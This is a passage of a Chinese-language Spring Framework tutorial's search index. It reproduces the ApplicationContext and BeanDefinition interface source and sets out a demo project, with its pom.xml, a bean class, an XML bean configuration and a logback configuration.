there is no parent\n     * and this is the root of the context hierarchy.\n     * @return the parent context, or {@code null} if there is no parent\n     */\n    @Nullable\n    ApplicationContext getParent();\n\n    /**\n     * Expose AutowireCapableBeanFactory functionality for this context.\n     * &lt;p&gt;This is not typically used by application code, except for the purpose of\n     * initializing bean instances that live outside of the application context,\n     * applying the Spring bean lifecycle (fully or partly) to them.\n     * &lt;p&gt;Alternatively, the internal BeanFactory exposed by the\n     * {@link ConfigurableApplicationContext} interface offers access to the\n     * {@link AutowireCapableBeanFactory} interface too. The present method mainly\n     * serves as a convenient, specific facility on the ApplicationContext interface.\n     * &lt;p&gt;&lt;b&gt;NOTE: As of 4.2, this method will consistently throw IllegalStateException\n     * after the application context has been closed.&lt;/b&gt; In current Spring Framework\n     * versions, only refreshable application contexts behave that way; as of 4.2,\n     * all application context implementations will be required to comply.\n     * @return the AutowireCapableBeanFactory for this context\n     * @throws IllegalStateException if the context does not support the\n     * {@link AutowireCapableBeanFactory} interface, or does not hold an\n     * autowire-capable bean factory yet (e.g. if {@code refresh()} has\n     * never been called), or if the context has been closed already\n     * @see ConfigurableApplicationContext#refresh()\n     * @see ConfigurableApplicationContext#getBeanFactory()\n     */\n    AutowireCapableBeanFactory getAutowireCapableBeanFactory() throws IllegalStateException;\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#applicationcontext_1","title":"ApplicationContext\u200b\u65b9\u6cd5\u200b\u5c5e\u6027\u200b\u6458\u8981","text":"Java<pre><code>public interface ApplicationContext extends EnvironmentCapable, ListableBeanFactory, HierarchicalBeanFactory,\n        MessageSource, ApplicationEventPublisher, ResourcePatternResolver {\n\n    @Nullable\n    String getId();\n\n\n    String getApplicationName();\n\n\n    String getDisplayName();\n\n\n    long getStartupDate();\n\n\n    @Nullable\n    ApplicationContext getParent();\n\n    AutowireCapableBeanFactory getAutowireCapableBeanFactory() throws IllegalStateException;\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#15-beandefination","title":"1.5 BeanDefination\u200b\u63a5\u53e3","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#beandefination","title":"BeanDefination\u200b\u63a5\u53e3\u5b9a\u4e49\u200b\u89e3\u6790","text":"<ul> <li>BeanDefination\u200b\u7528\u4e8e\u200b\u7ba1\u7406\u200bIoc\u200b\u5bb9\u5668\u200b\u4e2d\u200bJavaBean\u200b\u4e0e\u200bJavaBean\u200b\u4e4b\u95f4\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff0c\u200b\u5176\u200b\u62bd\u8c61\u200b\u4e86\u200bJava\u200b\u5f00\u53d1\u4eba\u5458\u200b\u5bf9\u4e8e\u200bJavaBean\u200b\u7684\u200b\u5b9a\u4e49\u200b</li> <li>Spring\u200b\u5c06\u200b\u5f00\u53d1\u4eba\u5458\u200b\u5b9a\u4e49\u200b\u7684\u200bJavaBean\u200b\u7684\u200b\u6570\u636e\u7ed3\u6784\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200bBeanDefination\u200b\u6570\u636e\u7ed3\u6784\u200b\u8fdb\u884c\u200b\u7ef4\u62a4\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#_6","title":"\u5b8c\u6574\u7248\u200b\u6e90\u7801\u200b\uff1a","text":"Java<pre><code>/*\n * Copyright 2002-2019 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.springframework.beans.factory.config;\n\nimport org.springframework.beans.BeanMetadataElement;\nimport org.springframework.beans.MutablePropertyValues;\nimport org.springframework.core.AttributeAccessor;\nimport org.springframework.core.ResolvableType;\nimport org.springframework.lang.Nullable;\n\n/**\n * A BeanDefinition describes a bean instance, which has property values,\n * constructor argument values, and further information supplied by\n * concrete implementations.\n *\n * &lt;p&gt;This is just a minimal interface: The main intention is to allow a\n * {@link BeanFactoryPostProcessor} to introspect and modify property values\n * and other bean metadata.\n *\n * @author Juergen Hoeller\n * @author Rob Harrop\n * @since 19.03.2004\n * @see ConfigurableListableBeanFactory#getBeanDefinition\n * @see org.springframework.beans.factory.support.RootBeanDefinition\n * @see org.springframework.beans.factory.support.ChildBeanDefinition\n */\npublic interface BeanDefinition extends AttributeAccessor, BeanMetadataElement {\n\n    /**\n     * Scope identifier for the standard singleton scope: \"singleton\".\n     * &lt;p&gt;Note that extended bean factories might support further scopes.\n     * @see #setScope\n     */\n    String SCOPE_SINGLETON = ConfigurableBeanFactory.SCOPE_SINGLETON;\n\n    /**\n     * Scope identifier for the standard prototype scope: \"prototype\".\n     * &lt;p&gt;Note that extended bean factories might support further scopes.\n     * @see #setScope\n     */\n    String SCOPE_PROTOTYPE = ConfigurableBeanFactory.SCOPE_PROTOTYPE;\n\n\n    /**\n     * Role hint indicating that a {@code BeanDefinition} is a major part\n     * of the application. Typically corresponds to a user-defined bean.\n     */\n    int ROLE_APPLICATION = 0;\n\n    /**\n     * Role hint indicating that a {@code BeanDefinition} is a supporting\n     * part of some larger configuration, typically an outer\n     * {@link org.springframework.beans.factory.parsing.ComponentDefinition}.\n     * {@code SUPPORT} beans are considered important enough to be aware\n     * of when looking more closely at a particular\n     * {@link org.springframework.beans.factory.parsing.ComponentDefinition},\n     * but not when looking at the overall configuration of an application.\n     */\n    int ROLE_SUPPORT = 1;\n\n    /**\n     * Role hint indicating that a {@code BeanDefinition} is providing an\n     * entirely background role and has no relevance to the end-user. This hint is\n     * used when registering beans that are completely part of the internal workings\n     * of a {@link org.springframework.beans.factory.parsing.ComponentDefinition}.\n     */\n    int ROLE_INFRASTRUCTURE = 2;\n\n\n    // Modifiable attributes\n\n    /**\n     * Set the name of the parent definition of this bean definition, if any.\n     */\n    void setParentName(@Nullable String parentName);\n\n    /**\n     * Return the name of the parent definition of this bean definition, if any.\n     */\n    @Nullable\n    String getParentName();\n\n    /**\n     * Specify the bean class name of this bean definition.\n     * &lt;p&gt;The class name can be modified during bean factory post-processing,\n     * typically replacing the original class name with a parsed variant of it.\n     * @see #setParentName\n     * @see #setFactoryBeanName\n     * @see #setFactoryMethodName\n     */\n    void setBeanClassName(@Nullable String beanClassName);\n\n    /**\n     * Return the current bean class name of this bean definition.\n     * &lt;p&gt;Note that this does not have to be the actual class name used at runtime, in\n     * case of a child definition overriding/inheriting the class name from its parent.\n     * Also, this may just be the class that a factory method is called on, or it may\n     * even be empty in case of a factory bean reference that a method is called on.\n     * Hence, do &lt;i&gt;not&lt;/i&gt; consider this to be the definitive bean type at runtime but\n     * rather only use it for parsing purposes at the individual bean definition level.\n     * @see #getParentName()\n     * @see #getFactoryBeanName()\n     * @see #getFactoryMethodName()\n     */\n    @Nullable\n    String getBeanClassName();\n\n    /**\n     * Override the target scope of this bean, specifying a new scope name.\n     * @see #SCOPE_SINGLETON\n     * @see #SCOPE_PROTOTYPE\n     */\n    void setScope(@Nullable String scope);\n\n    /**\n     * Return the name of the current target scope for this bean,\n     * or {@code null} if not known yet.\n     */\n    @Nullable\n    String getScope();\n\n    /**\n     * Set whether this bean should be lazily initialized.\n     * &lt;p&gt;If {@code false}, the bean will get instantiated on startup by bean\n     * factories that perform eager initialization of singletons.\n     */\n    void setLazyInit(boolean lazyInit);\n\n    /**\n     * Return whether this bean should be lazily initialized, i.e. not\n     * eagerly instantiated on startup. Only applicable to a singleton bean.\n     */\n    boolean isLazyInit();\n\n    /**\n     * Set the names of the beans that this bean depends on being initialized.\n     * The bean factory will guarantee that these beans get initialized first.\n     */\n    void setDependsOn(@Nullable String... dependsOn);\n\n    /**\n     * Return the bean names that this bean depends on.\n     */\n    @Nullable\n    String[] getDependsOn();\n\n    /**\n     * Set whether this bean is a candidate for getting autowired into some other bean.\n     * &lt;p&gt;Note that this flag is designed to only affect type-based autowiring.\n     * It does not affect explicit references by name, which will get resolved even\n     * if the specified bean is not marked as an autowire candidate. As a consequence,\n     * autowiring by name will nevertheless inject a bean if the name matches.\n     */\n    void setAutowireCandidate(boolean autowireCandidate);\n\n    /**\n     * Return whether this bean is a candidate for getting autowired into some other bean.\n     */\n    boolean isAutowireCandidate();\n\n    /**\n     * Set whether this bean is a primary autowire candidate.\n     * &lt;p&gt;If this value is {@code true} for exactly one bean among multiple\n     * matching candidates, it will serve as a tie-breaker.\n     */\n    void setPrimary(boolean primary);\n\n    /**\n     * Return whether this bean is a primary autowire candidate.\n     */\n    boolean isPrimary();\n\n    /**\n     * Specify the factory bean to use, if any.\n     * This the name of the bean to call the specified factory method on.\n     * @see #setFactoryMethodName\n     */\n    void setFactoryBeanName(@Nullable String factoryBeanName);\n\n    /**\n     * Return the factory bean name, if any.\n     */\n    @Nullable\n    String getFactoryBeanName();\n\n    /**\n     * Specify a factory method, if any. This method will be invoked with\n     * constructor arguments, or with no arguments if none are specified.\n     * The method will be invoked on the specified factory bean, if any,\n     * or otherwise as a static method on the local bean class.\n     * @see #setFactoryBeanName\n     * @see #setBeanClassName\n     */\n    void setFactoryMethodName(@Nullable String factoryMethodName);\n\n    /**\n     * Return a factory method, if any.\n     */\n    @Nullable\n    String getFactoryMethodName();\n\n    /**\n     * Return the constructor argument values for this bean.\n     * &lt;p&gt;The returned instance can be modified during bean factory post-processing.\n     * @return the ConstructorArgumentValues object (never {@code null})\n     */\n    ConstructorArgumentValues getConstructorArgumentValues();\n\n    /**\n     * Return if there are constructor argument values defined for this bean.\n     * @since 5.0.2\n     */\n    default boolean hasConstructorArgumentValues() {\n        return !getConstructorArgumentValues().isEmpty();\n    }\n\n    /**\n     * Return the property values to be applied to a new instance of the bean.\n     * &lt;p&gt;The returned instance can be modified during bean factory post-processing.\n     * @return the MutablePropertyValues object (never {@code null})\n     */\n    MutablePropertyValues getPropertyValues();\n\n    /**\n     * Return if there are property values values defined for this bean.\n     * @since 5.0.2\n     */\n    default boolean hasPropertyValues() {\n        return !getPropertyValues().isEmpty();\n    }\n\n    /**\n     * Set the name of the initializer method.\n     * @since 5.1\n     */\n    void setInitMethodName(@Nullable String initMethodName);\n\n    /**\n     * Return the name of the initializer method.\n     * @since 5.1\n     */\n    @Nullable\n    String getInitMethodName();\n\n    /**\n     * Set the name of the destroy method.\n     * @since 5.1\n     */\n    void setDestroyMethodName(@Nullable String destroyMethodName);\n\n    /**\n     * Return the name of the destroy method.\n     * @since 5.1\n     */\n    @Nullable\n    String getDestroyMethodName();\n\n    /**\n     * Set the role hint for this {@code BeanDefinition}. The role hint\n     * provides the frameworks as well as tools with an indication of\n     * the role and importance of a particular {@code BeanDefinition}.\n     * @since 5.1\n     * @see #ROLE_APPLICATION\n     * @see #ROLE_SUPPORT\n     * @see #ROLE_INFRASTRUCTURE\n     */\n    void setRole(int role);\n\n    /**\n     * Get the role hint for this {@code BeanDefinition}. The role hint\n     * provides the frameworks as well as tools with an indication of\n     * the role and importance of a particular {@code BeanDefinition}.\n     * @see #ROLE_APPLICATION\n     * @see #ROLE_SUPPORT\n     * @see #ROLE_INFRASTRUCTURE\n     */\n    int getRole();\n\n    /**\n     * Set a human-readable description of this bean definition.\n     * @since 5.1\n     */\n    void setDescription(@Nullable String description);\n\n    /**\n     * Return a human-readable description of this bean definition.\n     */\n    @Nullable\n    String getDescription();\n\n\n    // Read-only attributes\n\n    /**\n     * Return a resolvable type for this bean definition,\n     * based on the bean class or other specific metadata.\n     * &lt;p&gt;This is typically fully resolved on a runtime-merged bean definition\n     * but not necessarily on a configuration-time definition instance.\n     * @return the resolvable type (potentially {@link ResolvableType#NONE})\n     * @since 5.2\n     * @see ConfigurableBeanFactory#getMergedBeanDefinition\n     */\n    ResolvableType getResolvableType();\n\n    /**\n     * Return whether this a &lt;b&gt;Singleton&lt;/b&gt;, with a single, shared instance\n     * returned on all calls.\n     * @see #SCOPE_SINGLETON\n     */\n    boolean isSingleton();\n\n    /**\n     * Return whether this a &lt;b&gt;Prototype&lt;/b&gt;, with an independent instance\n     * returned for each call.\n     * @since 3.0\n     * @see #SCOPE_PROTOTYPE\n     */\n    boolean isPrototype();\n\n    /**\n     * Return whether this bean is \"abstract\", that is, not meant to be instantiated.\n     */\n    boolean isAbstract();\n\n    /**\n     * Return a description of the resource that this bean definition\n     * came from (for the purpose of showing context in case of errors).\n     */\n    @Nullable\n    String getResourceDescription();\n\n    /**\n     * Return the originating BeanDefinition, or {@code null} if none.\n     * Allows for retrieving the decorated bean definition, if any.\n     * &lt;p&gt;Note that this method returns the immediate originator. Iterate through the\n     * originator chain to find the original BeanDefinition as defined by the user.\n     */\n    @Nullable\n    BeanDefinition getOriginatingBeanDefinition();\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#beandefination_1","title":"BeanDefination\u200b\u65b9\u6cd5\u200b\u5c5e\u6027\u200b\u6458\u8981","text":"Java<pre><code>public interface BeanDefinition extends AttributeAccessor, BeanMetadataElement {\n\n    String SCOPE_SINGLETON = ConfigurableBeanFactory.SCOPE_SINGLETON;\n\n    String SCOPE_PROTOTYPE = ConfigurableBeanFactory.SCOPE_PROTOTYPE;\n\n    int ROLE_APPLICATION = 0;\n\n\n    int ROLE_SUPPORT = 1;\n\n    // infrastructure\n    int ROLE_INFRASTRUCTURE = 2;\n\n\n    // Modifiable attributes\n\n    void setParentName(@Nullable String parentName);\n\n\n    @Nullable\n    String getParentName();\n\n\n    void setBeanClassName(@Nullable String beanClassName);\n\n\n    @Nullable\n    String getBeanClassName();\n\n\n    void setScope(@Nullable String scope);\n\n\n    @Nullable\n    String getScope();\n\n\n    void setLazyInit(boolean lazyInit);\n\n\n    boolean isLazyInit();\n\n\n    void setDependsOn(@Nullable String... dependsOn);\n\n\n    @Nullable\n    String[] getDependsOn();\n\n\n    void setAutowireCandidate(boolean autowireCandidate);\n\n\n    boolean isAutowireCandidate();\n\n\n    void setPrimary(boolean primary);\n\n\n    boolean isPrimary();\n\n\n    void setFactoryBeanName(@Nullable String factoryBeanName);\n\n\n    @Nullable\n    String getFactoryBeanName();\n\n\n    void setFactoryMethodName(@Nullable String factoryMethodName);\n\n\n    @Nullable\n    String getFactoryMethodName();\n\n\n    ConstructorArgumentValues getConstructorArgumentValues();\n\n\n    default boolean hasConstructorArgumentValues() {\n        return !getConstructorArgumentValues().isEmpty();\n    }\n\n\n    MutablePropertyValues getPropertyValues();\n\n\n    default boolean hasPropertyValues() {\n        return !getPropertyValues().isEmpty();\n    }\n\n\n    void setInitMethodName(@Nullable String initMethodName);\n\n    @Nullable\n    String getInitMethodName();\n\n\n    void setDestroyMethodName(@Nullable String destroyMethodName);\n\n\n    @Nullable\n    String getDestroyMethodName();\n\n\n    void setRole(int role);\n\n\n    int getRole();\n\n\n    void setDescription(@Nullable String description);\n\n    @Nullable\n    String getDescription();\n\n\n    // Read-only attributes\n\n\n    ResolvableType getResolvableType();\n\n\n    boolean isSingleton();\n\n\n    boolean isPrototype();\n\n\n    boolean isAbstract();\n\n\n    @Nullable\n    String getResourceDescription();\n\n\n    @Nullable\n    BeanDefinition getOriginatingBeanDefinition();\n\n}\n\n\n\n// org.springframework.core.AttributeAccessor\npackage org.springframework.core;\npublic interface AttributeAccessor {\n\n    void setAttribute(String name, @Nullable Object value);\n\n\n    @Nullable\n    Object getAttribute(String name);\n\n\n    @Nullable\n    Object removeAttribute(String name);\n\n\n    boolean hasAttribute(String name);\n\n\n    String[] attributeNames();\n\n}\n\n\n\n// org.springframework.beans.BeanMetadataElemen\npackage org.springframework.beans;\npublic interface BeanMetadataElement {\n\n    @Nullable\n    default Object getSource() {\n        return null;\n    }\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#2demo","title":"2.\u200b\u4ece\u200b\u4e00\u4e2a\u200bDemo\u200b\u7a0b\u5e8f\u200b\u5f00\u59cb","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#21-demo","title":"2.1 Demo\u200b\u9879\u76ee\u200b\u914d\u7f6e","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#mavenpomxml","title":"maven\u200b\u7684\u200bpom.xml\u200b\u914d\u7f6e\u6587\u4ef6","text":"XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;\n    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n    &lt;!--        &lt;parent&gt;--&gt;\n    &lt;!--            &lt;groupId&gt;com.acanx&lt;/groupId&gt;--&gt;\n    &lt;!--            &lt;artifactId&gt;ACANX-JavaEE-Dependencies&lt;/artifactId&gt;--&gt;\n    &lt;!--            &lt;version&gt;0.0.1&lt;/version&gt;--&gt;\n    &lt;!--        &lt;/parent&gt;--&gt;\n\n    &lt;groupId&gt;com.acanx&lt;/groupId&gt;\n    &lt;artifactId&gt;JavaWeb-Spring&lt;/artifactId&gt;\n    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\n    &lt;packaging&gt;war&lt;/packaging&gt;\n\n    &lt;name&gt;JavaWeb-Spring&lt;/name&gt;\n    &lt;description&gt;JavaWeb-Spring project&lt;/description&gt;\n\n\n    &lt;properties&gt;\n        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;\n        &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt;\n        &lt;java.version&gt;11&lt;/java.version&gt;\n        &lt;spring.version&gt;5.2.1.RELEASE&lt;/spring.version&gt;\n        &lt;!-- log4j\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\u7ba1\u7406\u200b\u5305\u200b\u7248\u672c\u200b --&gt;\n        &lt;slf4j.version&gt;2.0.0-alpha1&lt;/slf4j.version&gt;\n        &lt;logback.version&gt;1.3.0-alpha5&lt;/logback.version&gt;\n        &lt;!-- log4j\u200b\u65e5\u5fd7\u200b\u5305\u200b\u7248\u672c\u53f7\u200b --&gt;\n        &lt;log4j2.version&gt;2.8.2&lt;/log4j2.version&gt;\n        &lt;log4j.version&gt;1.2.17&lt;/log4j.version&gt;\n        &lt;junit.version&gt;4.12&lt;/junit.version&gt;\n        &lt;fastjson.version&gt;1.2.62&lt;/fastjson.version&gt;\n        &lt;maven-compiler-plugin.version&gt;3.8.1&lt;/maven-compiler-plugin.version&gt;\n    &lt;/properties&gt;\n\n    &lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;\n            &lt;version&gt;${spring.version}&lt;/version&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;\n            &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;\n            &lt;version&gt;${logback.version}&lt;/version&gt;\n        &lt;/dependency&gt;\n        &lt;!-- \u200b\u6dfb\u52a0\u200bfastjson --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;\n            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;\n            &lt;version&gt;${fastjson.version}&lt;/version&gt;\n        &lt;/dependency&gt;\n        &lt;!--  \u200b\u5355\u5143\u6d4b\u8bd5\u200b--&gt;\n        &lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;junit&lt;/groupId&gt;\n            &lt;artifactId&gt;junit&lt;/artifactId&gt;\n            &lt;version&gt;${junit.version}&lt;/version&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n\n    &lt;/dependencies&gt;\n\n    &lt;build&gt;\n        &lt;plugins&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;\n                &lt;version&gt;${maven-compiler-plugin.version}&lt;/version&gt;\n                &lt;configuration&gt;\n                    &lt;target&gt;11&lt;/target&gt;\n                    &lt;source&gt;11&lt;/source&gt;\n                &lt;/configuration&gt;\n            &lt;/plugin&gt;\n        &lt;/plugins&gt;\n    &lt;/build&gt;\n&lt;/project&gt;\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#22-demo","title":"2.2 Demo\u200b\u7a0b\u5e8f","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#221","title":"2.2.1\u200b\u542f\u52a8\u200b\u7c7b","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:com.acanx.spring.xml.CspringIocConfigByFileSystemXmlApplicationContext.java Java<pre><code>package com.acanx.spring.xml;\n\nimport com.acanx.spring.bean.Car;\nimport org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.support.FileSystemXmlApplicationContext;\n\n/**\n * ACANX-JavaWeb / com.acanx.spring.xml / SpringIocConfigByXmlFileInClassPath.java\n * \u200b\u6587\u4ef6\u200b\u7531\u200b ACANX \u200b\u521b\u5efa\u200b\u4e8e\u200b 2019/7/30 - 13:39\n * Description  SpringIocConfigByXmlFileInClassPath:\n * \u200b\u8865\u5145\u200b\u8bf4\u660e\u200b\uff1a \u200b\u4f7f\u7528\u200bFileSystemXmlApplicationContext\u200b\u52a0\u8f7d\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e0b\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\n *\n * @author ACANX\n * @version 0.0.1.0\n * @date 2019/7/30  13:39\n * @since 0.0.1-SNAPSHOT\n */\npublic class CspringIocConfigByFileSystemXmlApplicationContext {\n   private static final Logger logger= LoggerFactory.getLogger(CspringIocConfigByFileSystemXmlApplicationContext.class);\n   public static void main(String[] args)  {\n        logger.info(\"-------------------\");\n        logger.info(System.getProperty(\"org.apache.commons.logging.LogFactory\"));\n        logger.info(System.getProperty(\"org.apache.commons.logging.Log\"));\n        logger.info(\"-------------------\");\n        String location=\"D:\\\\ProgramCode\\\\JavaCode\\\\ACANX-JavaWeb\\\\JavaWeb-Spring\\\\ApplicationContextC.xml\";\n        ApplicationContext applicationContext = new FileSystemXmlApplicationContext(location);\n        Car car = (Car) applicationContext.getBean(\"myCar\");\n        logger.info(car.toString());\n        logger.info(\"Info :{}\",logger.isInfoEnabled());\n        String[] beanNames=applicationContext.getBeanDefinitionNames();\n        for (String beanName:beanNames) {\n             logger.info(beanName+\"::::: \"+applicationContext.getBean(beanName).toString());\n        }\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#222bena","title":"2.2.2\u200b\u4f7f\u7528\u200b\u5230\u200b\u7684\u200bBena\u200b\u5bf9\u8c61","text":"Java<pre><code>package com.acanx.spring.bean;\n\npublic class Car {\n\n    private  String name;\n\n    private  String price;\n\n    // get set \u200b\u9ed8\u8ba4\u200b\u6784\u9020\u65b9\u6cd5\u200b\u5df2\u200b\u7701\u7565\u200b\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#223-springcontextxmlapplicationcontextcxml","title":"2.2.3 springContext\u200b\u7684\u200bxml\u200b\u6587\u4ef6\u200bApplicationContextC.xml","text":"XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt;\n\n    &lt;bean name=\"myCar\" class=\"com.acanx.spring.bean.Car\" &gt;\n        &lt;property name=\"name\" value=\"QQAI\"/&gt;\n        &lt;property name=\"price\" value=\"2222\"/&gt;\n    &lt;/bean&gt;\n\n&lt;/beans&gt;\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#224-logbackxmlresources","title":"2.2.4 \u200b\u914d\u7f6e\u200b\u65e5\u5fd7\u200b logback.xml\uff08resources\u200b\u6587\u4ef6\u5939\u200b\u4e0b\u200b\uff09","text":"XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration scan=\"true\" scanPeriod=\"60 seconds\" debug=\"false\"&gt;\n\n    &lt;property name=\"LOG_PATH\" value=\".log\"/&gt;\n    &lt;property name=\"APP_NAME\" value=\"IOCDemo\"/&gt;\n    &lt;!--\u200b\u8bbe\u7f6e\u200b\u7cfb\u7edf\u65e5\u5fd7\u200b\u76ee\u5f55\u200b--&gt;\n    &lt;property name=\"APP_DIR\" value=\"app-IOCDemo\"/&gt;\n\n    &lt;property name=\"CONSOLE_LOG_PATTERN\" value=\"[CLP]${CONSOLE_LOG_PATTERN:-%clr(%d{${LOG_DATEFORMAT_PATTERN:-yyyy-MM-dd HH:mm:ss.SSS}}){faint} %clr(${LOG_LEVEL_PATTERN:-%5p}) %clr(${PID:- }){magenta} %clr(---){faint} %clr([%15.15t]){faint} %clr(%-40.40logger{39}){cyan} %clr(%-15.15method){cyan} %clr([%4.4line{4}]){magenta} %clr(:){faint} %m%n${LOG_EXCEPTION_CONVERSION_WORD:-%wEx}}\"/&gt;\n    &lt;property name=\"FILE_LOG_PATTERN\" value=\"${FILE_LOG_PATTERN:-%d{${LOG_DATEFORMAT_PATTERN:-yyyy-MM-dd HH:mm:ss.SSS}} ${LOG_LEVEL_PATTERN:-%5p} ${PID:- } --- [%t] %-40.40logger{39} : %m%n${LOG_EXCEPTION_CONVERSION_WORD:-%wEx}}\"/&gt;\n    &lt;property name=\"CONSOLE_LOGBACK_PATTERN\" value=\"[\u200b\u63a7\u5236\u53f0\u200b] %d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level | %-80logger # %-40M [%4line] : %msg%n\"/&gt;\n\n\n    &lt;contextName&gt;logback&lt;/contextName&gt;\n    &lt;!--\u200b\u8f93\u51fa\u200b\u5230\u200b\u63a7\u5236\u53f0\u200b--&gt;\n    &lt;appender name=\"CONSOLE\" class=\"ch.qos.logback.core.ConsoleAppender\"&gt;\n        &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt;\n            &lt;level&gt;TRACE&lt;/level&gt;\n        &lt;/filter&gt;\n        &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt;\n            &lt;Pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/Pattern&gt;\n        &lt;/layout&gt;\n        &lt;encoder&gt;\n            &lt;!--  \u200b\u6587\u4ef6\u540d\u200b [%file]--&gt;\n            &lt;pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/pattern&gt;\n        &lt;/encoder&gt;\n    &lt;/appender&gt;\n\n    &lt;appender name=\"ERROR_FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt;\n        &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt;\n            &lt;level&gt;ERROR&lt;/level&gt;\n            &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt;\n            &lt;onMismatch&gt;DENY&lt;/onMismatch&gt;\n        &lt;/filter&gt;\n        &lt;File&gt;.log/ACANX-JavaWeb/LOG-ERROR.log&lt;/File&gt;\n        &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt;\n            &lt;fileNamePattern&gt;.log/server-error-%d{yyyyMMdd}.log.%i\n            &lt;/fileNamePattern&gt;\n            &lt;timeBasedFileNamingAndTriggeringPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP\"&gt;\n                &lt;maxFileSize&gt;5MB&lt;/maxFileSize&gt;\n            &lt;/timeBasedFileNamingAndTriggeringPolicy&gt;\n            &lt;maxHistory&gt;2&lt;/maxHistory&gt;\n        &lt;/rollingPolicy&gt;\n        &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt;\n            &lt;Pattern&gt;${CONSOLE_LOGBACK_PATTERN}&lt;/Pattern&gt;\n        &lt;/layout&gt;\n    &lt;/appender&gt;\n\n\n    &lt;appender name=\"WARN_FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt;\n        &lt;filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\"&gt;\n            &lt;level&gt;WARN&lt;/level&gt;\n            &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt;\n            &lt;onMismatch&gt;DENY&lt;/onMismatch&gt;\n        &lt;/filter&gt;\n        &lt;File&gt;.log/ACANX-JavaWeb/LOG-WARN.log&lt;/File&gt;\n        &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt;\n            &lt;fileNamePattern&gt;.log/ACANX-JavaWeb/server-WARN-%d{yyyyMMdd}.log.%i\n            &lt;/fileNamePattern&gt;\n            